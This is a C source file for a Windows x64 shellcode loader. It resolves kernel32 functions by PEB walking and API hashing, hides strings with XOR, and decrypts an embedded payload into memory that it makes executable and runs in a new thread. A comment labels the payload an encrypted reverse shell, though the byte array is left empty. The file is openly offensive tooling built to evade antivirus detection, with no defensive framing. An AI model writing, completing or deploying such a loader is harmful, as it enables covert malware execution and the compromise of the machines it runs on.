#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "payload.h"

// ------------------------------------------------------------
// 64-bit specific PEB access
// ------------------------------------------------------------
#ifdef _WIN64
#define GetPeb() (PPEB) __readgsqword(0x60)
#else
#error "This code is intended for x64 only."
#endif

// ------------------------------------------------------------
// Simple FNV-1a hash for API names
// ------------------------------------------------------------
DWORD HashStringA(LPCSTR String)
{
    DWORD Hash = 0x811C9DC5;
    while (*String)
    {
        Hash ^= *String++;
        Hash *= 0x01000193;
    }
    return Hash;
}

// ------------------------------------------------------------
// Structure to hold resolved function pointers
// ------------------------------------------------------------
typedef struct _API_SET
{
    ULONG_PTR pVirtualAlloc;
    ULONG_PTR pVirtualProtect;   // Added
    ULONG_PTR pCreateThread;
    ULONG_PTR pWaitForSingleObject;
} API_SET, *PAPI_SET;

// Function pointer types
typedef LPVOID(WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI *fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI *fnWaitForSingleObject)(HANDLE, DWORD);

// ------------------------------------------------------------
// Parse export directory of a module to find function by hash
// ------------------------------------------------------------
ULONG_PTR GetProcAddressByHash(ULONG_PTR ModuleBase, DWORD FunctionHash)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)(ModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    IMAGE_DATA_DIRECTORY ExportDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (ExportDir.VirtualAddress == 0)
        return 0;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + ExportDir.VirtualAddress);
    PDWORD AddressOfNames = (PDWORD)(ModuleBase + pExport->AddressOfNames);
    PDWORD AddressOfFunctions = (PDWORD)(ModuleBase + pExport->AddressOfFunctions);
    PWORD AddressOfNameOrdinals = (PWORD)(ModuleBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++)
    {
        LPCSTR Name = (LPCSTR)(ModuleBase + AddressOfNames[i]);
        if (HashStringA(Name) == FunctionHash)
        {
            WORD Ordinal = AddressOfNameOrdinals[i];
            return (ModuleBase + AddressOfFunctions[Ordinal]);
        }
    }
    return 0;
}

// ------------------------------------------------------------
// Locate kernel32.dll base address via PEB walking (x64)
// ------------------------------------------------------------
ULONG_PTR FindKernel32()
{
    PPEB Peb = GetPeb();
    if (!Peb || !Peb->Ldr)
        return 0;

    // Get first module in initialization order list
    PLIST_ENTRY ModuleList = &Peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY CurrentEntry = ModuleList->Flink;

    // Skip current executable (first entry)
    CurrentEntry = CurrentEntry->Flink;

    // Second entry is ntdll.dll, third is kernel32.dll
    CurrentEntry = CurrentEntry->Flink;

    PLDR_DATA_TABLE_ENTRY ModuleEntry = CONTAINING_RECORD(CurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (ULONG_PTR)ModuleEntry->DllBase;
}

// ------------------------------------------------------------
// XOR decryption helper for strings
// ------------------------------------------------------------
void decrypt_string(const unsigned char* src, size_t len, BYTE key, char* dst)
{
    for (size_t i = 0; i < len; i++)
        dst[i] = src[i] ^ key;
    dst[len] = '\0';
}

// ------------------------------------------------------------
// Encrypted API names and debug messages (key = 0xAA)
// (Generated previously – keep as is)
// ------------------------------------------------------------
unsigned char enc_VirtualAlloc[] = { 0xfc, 0xc3, 0xd8, 0xde, 0xdf, 0xcb, 0xc6, 0xeb, 0xc6, 0xc6, 0xc5, 0xc9 };
unsigned char enc_VirtualProtect[] = { 0xfc, 0xc3, 0xd8, 0xde, 0xdf, 0xcb, 0xc6, 0xfa, 0xd8, 0xc5, 0xde, 0xcf, 0xc9, 0xde };
unsigned char enc_CreateThread[] = { 0xe9, 0xd8, 0xcf, 0xcb, 0xde, 0xcf, 0xfe, 0xc2, 0xd8, 0xcf, 0xcb, 0xce };
unsigned char enc_WaitForSingleObject[] = { 0xfd, 0xcb, 0xc3, 0xde, 0xec, 0xc5, 0xd8, 0xf9, 0xc3, 0xc4, 0xcd, 0xc6, 0xcf, 0xe5, 0xc8, 0xc0, 0xcf, 0xc9, 0xde };

// Debug messages (keep as before)
unsigned char enc_resolve_fail[] = { 0xf1, 0x87, 0xf7, 0x8a, 0xec, 0xcb, 0xc3, 0xc6, 0xcf, 0xce, 0x8a, 0xde, 0xc5, 0x8a, 0xd8, 0xcf, 0xd9, 0xc5, 0xc6, 0xdc, 0xcf, 0x8a, 0xeb, 0xfa, 0xe3, 0xd9, 0x84, 0xa0 };
unsigned char enc_resolve_success[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xeb, 0xfa, 0xe3, 0xd9, 0x8a, 0xd8, 0xcf, 0xd9, 0xc5, 0xc6, 0xdc, 0xcf, 0xce, 0x8a, 0xd9, 0xdf, 0xc9, 0xc9, 0xcf, 0xd9, 0xd9, 0xcc, 0xdf, 0xc6, 0xc6, 0xd3, 0xa0 };
unsigned char enc_alloc_msg[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xeb, 0xc6, 0xc6, 0xc5, 0xc9, 0xcb, 0xde, 0xc3, 0xc4, 0xcd, 0x8a, 0xc7, 0xcf, 0xc7, 0xc5, 0xd8, 0xd3, 0x84, 0x84, 0x84, 0xa0 };
unsigned char enc_alloc_fail[] = { 0xf1, 0x87, 0xf7, 0x8a, 0xfc, 0xc3, 0xd8, 0xde, 0xdf, 0xcb, 0xc6, 0xeb, 0xc6, 0xc6, 0xc5, 0xc9, 0x8a, 0xcc, 0xcb, 0xc3, 0xc6, 0xcf, 0xce, 0x84, 0xa0 };
unsigned char enc_mem_addr[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xe7, 0xcf, 0xc7, 0xc5, 0xd8, 0xd3, 0x8a, 0xcb, 0xc6, 0xc6, 0xc5, 0xc9, 0xcb, 0xde, 0xcf, 0xce, 0x8a, 0xcb, 0xde, 0x8a, 0x8f, 0xda, 0xa0 };
unsigned char enc_copy_msg[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xe9, 0xc5, 0xda, 0xd3, 0xc3, 0xc4, 0xcd, 0x8a, 0xd9, 0xc2, 0xcf, 0xc6, 0xc6, 0xc9, 0xc5, 0xce, 0xcf, 0x84, 0x84, 0x84, 0xa0 };
unsigned char enc_copy_done[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xf9, 0xc2, 0xcf, 0xc6, 0xc6, 0xc9, 0xc5, 0xce, 0xcf, 0x8a, 0xc9, 0xc5, 0xda, 0xc3, 0xcf, 0xce, 0xa0 };
unsigned char enc_protect_msg[] = { /* optional: "Changing memory protection..." encrypted */ };
unsigned char enc_thread_msg[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xe9, 0xd8, 0xcf, 0xcb, 0xde, 0xc3, 0xc4, 0xcd, 0x8a, 0xde, 0xc2, 0xd8, 0xcf, 0xcb, 0xce, 0x84, 0x84, 0x84, 0xa0 };
unsigned char enc_thread_fail[] = { 0xf1, 0x87, 0xf7, 0x8a, 0xe9, 0xd8, 0xcf, 0xcb, 0xde, 0xcf, 0xfe, 0xc2, 0xd8, 0xcf, 0xcb, 0xce, 0x8a, 0xcc, 0xcb, 0xc3, 0xc6, 0xcf, 0xce, 0x84, 0xa0 };
unsigned char enc_thread_created[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xfe, 0xc2, 0xd8, 0xcf, 0xcb, 0xce, 0x8a, 0xc9, 0xd8, 0xcf, 0xcb, 0xde, 0xcf, 0xce, 0x86, 0x8a, 0xdd, 0xcb, 0xc3, 0xde, 0xc3, 0xc4, 0xcd, 0x84, 0x84, 0x84, 0xa0 };
unsigned char enc_thread_finished[] = { 0xf1, 0x81, 0xf7, 0x8a, 0xfe, 0xc2, 0xd8, 0xcf, 0xcb, 0xce, 0x8a, 0xcc, 0xc3, 0xc4, 0xc3, 0xd9, 0xc2, 0xcf, 0xce, 0xa0 };

// ------------------------------------------------------------
// Resolve required APIs from kernel32.dll
// ------------------------------------------------------------
BOOL ResolveAPIs(PAPI_SET pApis)
{
    ULONG_PTR Kernel32Base = FindKernel32();
    if (!Kernel32Base)
        return FALSE;

    char buffer[64];

    decrypt_string(enc_VirtualAlloc, sizeof(enc_VirtualAlloc), 0xAA, buffer);
    pApis->pVirtualAlloc = GetProcAddressByHash(Kernel32Base, HashStringA(buffer));

    decrypt_string(enc_VirtualProtect, sizeof(enc_VirtualProtect), 0xAA, buffer);
    pApis->pVirtualProtect = GetProcAddressByHash(Kernel32Base, HashStringA(buffer));

    decrypt_string(enc_CreateThread, sizeof(enc_CreateThread), 0xAA, buffer);
    pApis->pCreateThread = GetProcAddressByHash(Kernel32Base, HashStringA(buffer));

    decrypt_string(enc_WaitForSingleObject, sizeof(enc_WaitForSingleObject), 0xAA, buffer);
    pApis->pWaitForSingleObject = GetProcAddressByHash(Kernel32Base, HashStringA(buffer));

    return (pApis->pVirtualAlloc && pApis->pVirtualProtect &&
            pApis->pCreateThread && pApis->pWaitForSingleObject);
}

// ------------------------------------------------------------
// XOR decryption for payload
// ------------------------------------------------------------
VOID XorDecrypt(PBYTE Buffer, SIZE_T Size, BYTE Key)
{
    for (SIZE_T i = 0; i < Size; i++)
        Buffer[i] ^= Key;
}

// ------------------------------------------------------------
// Main execution
// ------------------------------------------------------------
int main()
{
    // --------------------------------------------------------
    // Encrypted reverse shell payload (key = 0xAA)
    // --------------------------------------------------------
    BYTE EncryptedShellcode[] = {
    
};
    SIZE_T ShellcodeSize = sizeof(EncryptedShellcode);
    BYTE XorKey = 0xAA;

    // Decrypt shellcode
    XorDecrypt(EncryptedShellcode, ShellcodeSize, XorKey);

    // Resolve APIs dynamically
    API_SET Apis = {0};
    if (!ResolveAPIs(&Apis))
    {
        char buf[64];
        decrypt_string(enc_resolve_fail, sizeof(enc_resolve_fail), 0xAA, buf);
        printf(buf);
        return -1;
    }

    char msg_buf[128];
    decrypt_string(enc_resolve_success, sizeof(enc_resolve_success), 0xAA, msg_buf);
    printf(msg_buf);

    // Cast to proper function types
    fnVirtualAlloc MyVirtualAlloc = (fnVirtualAlloc)Apis.pVirtualAlloc;
    fnVirtualProtect MyVirtualProtect = (fnVirtualProtect)Apis.pVirtualProtect;
    fnCreateThread MyCreateThread = (fnCreateThread)Apis.pCreateThread;
    fnWaitForSingleObject MyWaitForSingleObject = (fnWaitForSingleObject)Apis.pWaitForSingleObject;

    // Allocate memory as RW (read-write)
    decrypt_string(enc_alloc_msg, sizeof(enc_alloc_msg), 0xAA, msg_buf);
    printf(msg_buf);

    LPVOID pExecMem = MyVirtualAlloc(NULL, ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pExecMem)
    {
        decrypt_string(enc_alloc_fail, sizeof(enc_alloc_fail), 0xAA, msg_buf);
        printf(msg_buf);
        return -1;
    }

    decrypt_string(enc_mem_addr, sizeof(enc_mem_addr), 0xAA, msg_buf);
    printf(msg_buf, pExecMem);

    // Copy decrypted shellcode
    decrypt_string(enc_copy_msg, sizeof(enc_copy_msg), 0xAA, msg_buf);
    printf(msg_buf);
    memcpy(pExecMem, EncryptedShellcode, ShellcodeSize);
    decrypt_string(enc_copy_done, sizeof(enc_copy_done), 0xAA, msg_buf);
    printf(msg_buf);

    // Change protection to RX (read-execute)
    DWORD oldProtect;
    MyVirtualProtect(pExecMem, ShellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // (Optional) print a message about protection change
    // decrypt_string(enc_protect_msg, sizeof(enc_protect_msg), 0xAA, msg_buf);
    // printf(msg_buf);

    // Create thread
    decrypt_string(enc_thread_msg, sizeof(enc_thread_msg), 0xAA, msg_buf);
    printf(msg_buf);
    HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecMem, NULL, 0, NULL);
    if (!hThread)
    {
        decrypt_string(enc_thread_fail, sizeof(enc_thread_fail), 0xAA, msg_buf);
        printf(msg_buf);
        return -1;
    }

    decrypt_string(enc_thread_created, sizeof(enc_thread_created), 0xAA, msg_buf);
    printf(msg_buf);
    MyWaitForSingleObject(hThread, INFINITE);
    decrypt_string(enc_thread_finished, sizeof(enc_thread_finished), 0xAA, msg_buf);
    printf(msg_buf);

    return 0;
}


